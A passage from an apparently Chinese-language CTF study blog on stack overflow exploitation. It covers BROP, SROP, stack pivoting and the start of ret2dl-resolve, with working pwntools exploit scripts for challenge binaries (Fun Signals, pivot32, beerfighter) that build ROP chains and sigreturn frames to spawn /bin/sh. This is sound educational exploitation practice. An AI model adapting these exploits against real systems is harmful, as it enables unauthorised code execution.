class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak2</span>(<span class="params">addr</span>):</span></span><br><span class="line">    buf_size = <span class="number">72</span></span><br><span class="line">    gadgets_addr = <span class="number">0x40078a</span></span><br><span class="line">    puts_call_addr = <span class="number">0x400547</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">    payload+= p64(gadgets_addr+<span class="number">9</span>)</span><br><span class="line">    payload+= p64(addr)</span><br><span class="line">    payload+= p64(puts_call_addr)</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    data = io.recv()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    log.info(<span class="string">&#x27;leaking: &#123;0&#125;: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr), hexlify(data)))</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak1</span>(<span class="params">puts_addr</span>):</span></span><br><span class="line">    system_addr = puts_addr - <span class="number">0x80970</span> + <span class="number">0x4f420</span></span><br><span class="line">    binsh_addr = puts_addr - <span class="number">0x80970</span> + <span class="number">0x1b3d88</span></span><br><span class="line">    <span class="keyword">return</span> system_addr, binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ret_addr</span>():</span> <span class="comment"># get func return addr to get the base address</span></span><br><span class="line">    retaddr = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt;= <span class="number">255</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp_addr = <span class="built_in">bytes</span>([j])</span><br><span class="line">                io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">                payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + retaddr + tmp_addr</span><br><span class="line">                io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">                sleep(<span class="number">0.2</span>)</span><br><span class="line">                tmp_recv = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;No password&#x27;</span> <span class="keyword">in</span> tmp_recv:</span><br><span class="line">                    retaddr = retaddr + tmp_addr</span><br><span class="line">                    log.info(<span class="string">&quot;------------&gt;correct address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(retaddr)))</span><br><span class="line">                    io.close()</span><br><span class="line">                    j = j + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    log.info(<span class="string">&quot;bad address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(tmp_addr)))</span><br><span class="line">                    j = j + <span class="number">1</span></span><br><span class="line">                    io.close()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                io.close()</span><br><span class="line">                j = j + <span class="number">1</span></span><br><span class="line">                log.info(<span class="string">&quot;bad address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(tmp_addr)))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                log.info(<span class="string">&quot;Cant&#x27;t connect&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    log.info(<span class="string">&quot;return address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(retaddr[::-<span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">return</span> retaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># buffersize = get_buffer_size()  # 72</span></span><br><span class="line"><span class="comment"># stop_addr = get_stop_addr(72)     # 0x400545</span></span><br><span class="line"><span class="comment"># gadgets_addr = get_gadgets_addr(72, 0x400545) #0x40078a</span></span><br><span class="line"><span class="comment"># puts_call_addr = get_puts_call_addr(72, 0x400545, 0x40078a) # 0x400547</span></span><br><span class="line"><span class="comment"># result = dump_memory(72, 0x400545, 0x40078a, 0x400547, 0x400000, 0x403000)</span></span><br><span class="line"><span class="comment"># with open(&quot;code1.bin&quot;, &#x27;wb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(result)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_got = 0x601018</span></span><br><span class="line"><span class="comment"># puts_addr = get_puts_addr(72, 0x400545, 0x40078a, 0x400547,puts_got) # 0x7ffff7a62970</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak1</span></span><br><span class="line"><span class="comment"># system_addr, binsh_addr = leak1(0x7ffff7a62970)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak2</span></span><br><span class="line"><span class="comment"># data = DynELF(leak2, 0x0400590)</span></span><br><span class="line"><span class="comment"># system_addr = data.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)</span></span><br><span class="line"><span class="comment"># log.info(&quot;ststem_addr : &#123;&#125;&quot;.format(hex(system_addr)))   # 0x7ffff7a31420</span></span><br><span class="line"><span class="comment"># binsh_addr = system_addr - 0x4f420 + 0x1b3d88</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="comment"># pwn(0x40078a, 0x7ffff7a31420, binsh_addr)</span></span><br><span class="line"></span><br><span class="line">get_ret_addr()</span><br></pre></td></tr></table></figure><blockquote><p>参考文章：<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html</a></p></blockquote><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>SROP与ROP类似，通过栈溢出，覆盖返回地址并执行gadgets控制执行流。不同的是，SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放在栈中。这个地方有点类似windows那个挂起线程，然后设置线程上下文，然后恢复线程的 设置线程上下文然后恢复线程。</p><h3 id="SROP原理"><a href="#SROP原理" class="headerlink" title="SROP原理"></a>SROP原理</h3><h4 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h4><p>Linux的系统调用中，64位和32位的系统调用表分别位于/usr/include/asm/unistd_64.h和/usr/include/asm/unistd_32.h中，另外还需要查看/usr/include/bits/syscall.h</p><p>比如write的系统调用号是1，就往RAX里存入1，执行syscall，其实就是执行的write函数，当然rdi, rsi, rdx 得存入参数才可以</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//syscall.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __NR_writev</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> SYS_writev __NR_writev</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//   unistd_64.h </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br></pre></td></tr></table></figure><p><code>int 0x80</code> 即80中断， 是最老的系统函数调用方式</p><p><code>syscall/sysret</code> 是amd64 制定的标准， 也是目前的x86 64位的标准，即amd64</p><p><code>sysenter/syssysexit</code> 是inter制定的x86 64位标准， 目前已被放弃</p><p><code>vdso</code> 是linux内核虚拟出的so, 实现了int 80 和 syscall，调用方式为 vsyscall</p><h4 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h4><p>当有中断或异常发送时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存相应的上下文，再跳转到之前注册好的signal handler中进程处理，待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。（这个地方好像windows的异常处理啊），具体步骤如下。</p><ol><li>一个signal frame被添加到栈，这个frame中包含了当前寄存器的值和一些signal信息；</li><li>一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn 系统调用；</li><li>signal handler被调用，signal handler的行为取决于收到了什么signal</li><li>signal handler执行完后，如果程序没有终止，则返回地址用于执行sigreturn 系统调用</li><li>sigreturn 利用 signal frame恢复所有的寄存器以回到之前的状态。</li><li>最后，程序执行继续。</li></ol><p>SROP，即Sigreturn Oriented Programming，就可以利用上面的第5步来进行攻击，即将返回地址覆盖为sigreturn gadget的指针，如果只有syscall，将RAX改为0XF，效果是一样的，然后在栈上覆盖上fake frame即可</p><blockquote><p>参考文章 <a href="https://energygreek.github.io/2020/11/09/system-calls-method/">https://energygreek.github.io/2020/11/09/system-calls-method/</a></p></blockquote><h3 id="pwntools-srop模块"><a href="#pwntools-srop模块" class="headerlink" title="pwntools srop模块"></a>pwntools srop模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&#x27;i386&#x27;</span>)<span class="comment"># 32位系统运行32位程序</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)<span class="comment"># 64位系统运行32位程序</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)<span class="comment"># 64位系统运行64位程序</span></span><br></pre></td></tr></table></figure><h3 id="Backdoor-CTF2017-Fun-Signals"><a href="#Backdoor-CTF2017-Fun-Signals" class="headerlink" title="Backdoor CTF2017: Fun Signals"></a>Backdoor CTF2017: Fun Signals</h3><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220330204611695.png" class="" title="image-20220330204611695"><p>什么保护都没有开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">objdump -d funsignals_player_bin -M intel  </span><br><span class="line"></span><br><span class="line">funsignals_player_bin:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .shellcode:</span><br><span class="line"></span><br><span class="line">0000000010000000 &lt;__start&gt;:</span><br><span class="line">    10000000:31 c0                xor    eax,eax</span><br><span class="line">    10000002:31 ff                xor    edi,edi</span><br><span class="line">    10000004:31 d2                xor    edx,edx</span><br><span class="line">    10000006:b6 04                mov    dh,0x4</span><br><span class="line">    10000008:48 89 e6             mov    rsi,rsp</span><br><span class="line">    1000000b:0f 05                syscall </span><br><span class="line">    1000000d:31 ff                xor    edi,edi</span><br><span class="line">    1000000f:6a 0f                push   0xf</span><br><span class="line">    10000011:58                   pop    rax</span><br><span class="line">    10000012:0f 05                syscall </span><br><span class="line">    10000014:cc                   int3   </span><br><span class="line"></span><br><span class="line">0000000010000015 &lt;syscall&gt;:</span><br><span class="line">    10000015:0f 05                syscall </span><br><span class="line">    10000017:48 31 ff             xor    rdi,rdi</span><br><span class="line">    1000001a:48 c7 c0 3c 00 00 00 mov    rax,0x3c</span><br><span class="line">    10000021:0f 05                syscall </span><br><span class="line"></span><br><span class="line">0000000010000023 &lt;flag&gt;:</span><br><span class="line">    10000023:66 61                data16 (bad) </span><br><span class="line">    10000025:6b 65 5f 66          imul   esp,DWORD PTR [rbp+0x5f],0x66</span><br><span class="line">    10000029:6c                   ins    BYTE PTR es:[rdi],dx</span><br><span class="line">    1000002a:61                   (bad)  </span><br><span class="line">    1000002b:67 5f                addr32 pop rdi</span><br><span class="line">    1000002d:68 65 72 65 5f       push   0x5f657265</span><br><span class="line">    10000032:61                   (bad)  </span><br><span class="line">    10000033:73 5f                jae    10000094 &lt;flag+0x71&gt;</span><br><span class="line">    10000035:6f                   outs   dx,DWORD PTR ds:[rsi]</span><br><span class="line">    10000036:72 69                jb     100000a1 &lt;flag+0x7e&gt;</span><br><span class="line">    10000038:67 69 6e 61 6c 5f 69 imul   ebp,DWORD PTR [esi+0x61],0x73695f6c</span><br><span class="line">    1000003f:73 </span><br><span class="line">    10000040:5f                   pop    rdi</span><br><span class="line">    10000041:61                   (bad)  </span><br><span class="line">    10000042:74 5f                je     100000a3 &lt;flag+0x80&gt;</span><br><span class="line">    10000044:73 65                jae    100000ab &lt;flag+0x88&gt;</span><br><span class="line">    10000046:72 76                jb     100000be &lt;flag+0x9b&gt;</span><br><span class="line">    10000048:65 72 00             gs jb  1000004b &lt;flag+0x28&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现程序，先执行了read命令，rdx,0x400，rsi是rsp rdi是0 ，执行read读入数据，把数据写到栈上，然后在执行调用号为0xf的系统调用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br></pre></td></tr></table></figure><p>所以只需要构造sigreturn frame，然后读入就OK了, exp为↓</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./funsignals_player_bin&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./funsignals_player_bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = constants.STDOUT_FILENO</span><br><span class="line">frame.rsi = elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">frame.rdx = <span class="number">50</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.send(<span class="built_in">bytes</span>(frame))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><p>stack pivoting 是一种将程序真实的堆栈转移到伪造堆栈上的技术，可用于绕过不可执行栈保护或者处理栈空间过小的情况。下面通过1个例题(32位的，书上还有个64位的，但是基本一样，不写了。。)来说下这种技术，这是ROP Emporium上的那个题</p><h3 id="pivot32"><a href="#pivot32" class="headerlink" title="pivot32"></a>pivot32</h3><p>IDA打开分析</p><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220403194200757.png" class="" title="image-20220403194200757"><p>是在pwnme这个函数中存在栈溢出，但是只溢出了16个字节，显然对于构造ROP链是不够的，所以我们要用到栈转移技术，怎么转移呢？其实就是用了leave ret指令，leave ret，其实就跟mov esp, ebp; pop ebp; pop rip的效果是一样的,</p><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220403194927269.png" class="" title="image-20220403194927269"><p>我们把old ebp的位置覆盖为leakaddr - 4.然后执行mov esp,ebp， 所以现在esp就是leakaddr - 4了，然后再执行pop ebp， leak addr - 4这个位置的数就给了ebp了，然后esp执行leak addr，再执行ret的时候，就从leak addr这里取地址了，这样就完成了栈转移</p><p>回到这个例题，我们第一次输入的数据存到新栈那里，这里就是真正的要构造的ROP了，目的是为了执行 call ret2win来获取flag（这个函数应该是作者定义的，放到了libpivot32.so中），第二次输入的数据就存在旧栈那里，目的就是转移栈。</p><p>exp为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;pivot32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;pivot32&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;libpivot32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0804882C</span></span><br><span class="line">xchg_eax_esp = <span class="number">0x804882E</span></span><br><span class="line">mov_eax_eax = <span class="number">0x8048830</span></span><br><span class="line">add_eax_ebx = <span class="number">0x08048833</span></span><br><span class="line">leave_ret = <span class="number">0x080485f5</span></span><br><span class="line">pop_ebx = <span class="number">0x080484a9</span></span><br><span class="line">call_eax=  <span class="number">0x080485f0</span></span><br><span class="line"></span><br><span class="line">foothold_plt = elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_got = elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">offset = lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>] - lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;pivot: &#x27;</span>)</span><br><span class="line">leakaddress = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">leakaddress = <span class="built_in">int</span>(leakaddress.decode(), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leakaddress: 0x%x&quot;</span> % leakaddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step1</span>():</span></span><br><span class="line">    payload = p32(foothold_plt)</span><br><span class="line">    payload += p32(pop_eax)</span><br><span class="line">    payload += p32(foothold_got)</span><br><span class="line">    payload += p32(mov_eax_eax)</span><br><span class="line">    payload += p32(pop_ebx)</span><br><span class="line">    payload += p32(offset)</span><br><span class="line">    payload += p32(add_eax_ebx)</span><br><span class="line">    payload += p32(call_eax)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step2</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">40</span></span><br><span class="line">    payload += p32(leakaddress - <span class="number">4</span>) <span class="comment"># pop ebp</span></span><br><span class="line">    payload += p32(leave_ret)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    step1()</span><br><span class="line">    step2()</span><br><span class="line">    io.recvall()</span><br></pre></td></tr></table></figure><h3 id="GreHack-CTF2017-beerfighter"><a href="#GreHack-CTF2017-beerfighter" class="headerlink" title="GreHack CTF2017: beerfighter"></a>GreHack CTF2017: beerfighter</h3><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220404121206279.png" class="" title="image-20220404121206279"><p>IDA打开分析，发现在这个地方存在溢出，程序中存在syscall，所以采用srop的技术，然后由于我们最终调用syscall，是把rax设置为SYS_execve，然后rdi是/bin/sh，所以我们还需要提前调用read，即syscall,rax为SYS_read，把 /bin/sh写入进去，写入到.data段，下面是EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;beerfighter&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;beerfighter&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x00400764</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">data_address = elf.get_section_by_name(<span class="string">&quot;.data&quot;</span>).header.sh_addr + <span class="number">0x10</span>       <span class="comment"># /bin/sh</span></span><br><span class="line">base_address = data_address + <span class="number">8</span>                                 <span class="comment"># new stack</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x040077a</span></span><br><span class="line">sigret_bytes = p64(pop_rax) + p64(constants.SYS_rt_sigreturn)+p64(syscall_addr)      <span class="comment"># 0xf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame2 = SigreturnFrame()</span><br><span class="line">frame2.rax = constants.SYS_execve</span><br><span class="line">frame2.rdi = data_address      </span><br><span class="line">frame2.rsi = <span class="number">0</span>      </span><br><span class="line">frame2.rdx = <span class="number">0</span>       </span><br><span class="line">frame2.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_read</span><br><span class="line">frame1.rdi = constants.STDIN_FILENO      </span><br><span class="line">frame1.rsi = data_address      </span><br><span class="line">frame1.rdx = <span class="built_in">len</span>(<span class="built_in">bytes</span>(frame2)) + <span class="number">32</span></span><br><span class="line">frame1.rsp = base_address       <span class="comment"># new stack# 可以采用这种方式进行stack pivot</span></span><br><span class="line">frame1.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_1</span>():</span></span><br><span class="line">    payload1 = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">1040</span> + <span class="number">8</span>)</span><br><span class="line">    payload1 += sigret_bytes</span><br><span class="line">    payload1 += <span class="built_in">bytes</span>(frame1)</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, payload1)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_2</span>():</span></span><br><span class="line">    payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload2 += sigret_bytes</span><br><span class="line">    payload2 += <span class="built_in">bytes</span>(frame2)</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    step_1()</span><br><span class="line">    step_2()</span><br></pre></td></tr></table></figure><h2 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h2><p>现代漏洞利用通常包含两个阶段</p><ol><li>第一步先通过信息泄露获得程序的内存布局</li><li>第二部才进行实际的漏洞利用</li></ol><p>然而从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是就有了ret2dl-resolve，巧妙的利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露，就可以直接标识关键函数的位置并调用。( 我感觉这个ret2dl-resolve有点类似于windows下的那个GetProcAddress函数，就是动态获取函数的地址。。</p><h3 id="ret2dl-resolve原理"><a href="#ret2dl-resolve原理" class="headerlink" title="ret2dl-resolve原理"></a>ret2dl-resolve原理</h3><p>动态装载器负责将二进制文件及依赖库加载到内存，该过程包含了对导入符号（函数和全局变量）的解析。</p><p>每个符号都是Elf_Sym结构体，这些符号又共同组成了.dynsym段, Elf32_Sym的结构体如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;         /<span class="number">4</span>字节* <span class="function">Symbol <span class="title">name</span> <span class="params">(string tbl index)</span> */ 相对于.dynstr段的偏移</span></span><br><span class="line"><span class="function">  Elf32_Addr    st_value</span>;        /<span class="number">4</span>字节* Symbol value */导出函数的地址，不导出时为<span class="literal">NULL</span></span><br><span class="line">  Elf32_Word    st_size;         /<span class="number">4</span>字节* Symbol size */</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>    st_info;      /<span class="number">1</span>字节* Symbol type <span class="keyword">and</span> binding */</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>    st_other;     /<span class="number">1</span>字节* Symbol visibility */</span><br><span class="line">  Elf32_Section    st_shndx;     /<span class="number">2</span>字节* Section index */</span><br><span class="line">&#125; 